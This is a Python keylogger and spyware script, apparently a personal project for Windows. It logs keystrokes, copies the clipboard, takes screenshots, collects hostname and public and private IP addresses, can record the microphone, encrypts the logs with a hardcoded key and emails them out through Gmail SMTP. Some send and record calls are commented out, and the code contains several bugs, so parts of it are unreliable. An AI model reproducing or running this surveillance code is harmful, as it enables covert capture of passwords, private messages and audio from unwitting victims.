# libraries for program
# email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# collect computer info
import socket
import platform
# clipboard
import win32clipboard
# keystrokes
from pynput.keyboard import Key, Listener
# system information to track time
import time
import os
# for microphones
from scipy.io.wavfile import write
import sounddevice
# encrypt files
from cryptography.fernet import Fernet
# username/request library
import getpass
from requests import get
# screenshot functionality
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# default variables
keys_info = 'key_log.txt'
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
microphone_time = 10
audio_info = 'audio.wav'
screenshot_info = 'screenshot.png'
key_info_e = "e_keys_info.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = 'e_clipboard.txt'
time_iteration = 15
number_of_iterations_end = 3
file_path = "C:\\Users\\Rose Allison\\PycharmProjects\\keylogger2\\Project"
extend = '\\'
file_merge = file_path + extend
email_address = "cyberkeyproject@gmail.com"
password = ""
to_address = "cyberkeyproject@gmail.com"

key = '-PGjQVgJkPZ0gpUPRJ2HiwjIYdAriDFaTaAE0-PR24w='

# email functionality
def send_email(filename, attachment, to_address):
    from_address = email_address
    new_msg = MIMEMultipart()
    new_msg['From'] = from_address
    new_msg['To'] = to_address
    new_msg['Subject'] = "Log File"
    body = "Body of Mail"
    new_msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    b = MIMEBase('application', 'octet-stream')
    b.set_payload(attachment.read())
    encoders.encode_base64(b)
    b.add_header('Content-Disposition', 'attachment; filename =%s' % filename)
    new_msg.attach(b)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = new_msg.as_string()
 #   s.sendmail(from_address, to_address, text)
    s.quit()

send_email(keys_info, file_path + extend + keys_info, to_address)


# computer information
def computer_info():
    with open(file_path + extend + system_info, 'a') as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address, most like max query \n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine Information: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ip_address + '\n')


computer_info()


# copy clipboard information
def copy_clipboard():
    with open(file_path + extend + clipboard_info, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data : \n" + pasted_data)
        except:
            f.write('Clipboard was not able to copied')


copy_clipboard()


# get microphone data if it is on
def microphone():
    fs = 44100
    seconds = microphone_time

    my_recording = sounddevice.rec(seconds + fs, samplerate=fs, channels=2)
    sounddevice.wait()

    write(file_path + extend + audio_info, fs, my_recording)


# microphone()

# screenshot of what is happening on the screen
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)


screenshot()

# timer to set iteration of time for the functions
number_of_iterations = 0
currentTime = time.time()
stopping_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    # functions and listener
    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        keys.append(key)
        count += 1
        print(key)
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open('key_log.txt', 'a') as f:
            for key in keys:
                f.write(str(key) + '\n')


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopping_time:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stopping_time:

        with open(file_path + extend + keys_info, 'w') as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_info, file_path + extend + screenshot_info, to_address)

        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stopping_time = time.time() + time_iteration

files_to_encrypt = [file_merge + system_info, file_merge + clipboard_info, + file_merge + keys_info]
encrypted_file_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + key_info_e]
count = 0
for encrypted_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'rb') as f:
        f.write(encrypted)

   # send_email(encrypted_file_names[count], encrypted_file_names[count], to_address)
    count += 1

time.sleep(120)

